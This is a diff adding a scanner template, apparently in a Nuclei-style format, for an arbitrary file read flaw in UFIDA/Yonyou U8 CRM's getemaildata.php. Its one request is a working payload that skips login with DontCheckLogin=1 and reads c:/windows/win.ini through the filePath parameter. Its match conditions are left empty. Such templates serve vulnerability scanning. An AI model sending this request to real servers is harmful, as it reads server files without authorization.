@@ -1,0 +1,18 @@
+id: yonyou-u8-crm-lfi
+brief:
+    title: UFIDA U8 CRM getemaildata.php - Arbitrary File Read
+    by: SleepingBag945
+    level: high
+    about: There is an arbitrary file reading vulnerability in getemaildata.php of UFIDA U8 CRM customer relationship management system. An attacker can obtain sensitive files in the server through the vulner...
+    label:
+        - yonyou
+        - u8-crm
+        - lfi
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini'
+      head:
+        Content-Type: application/json
+      signs: []
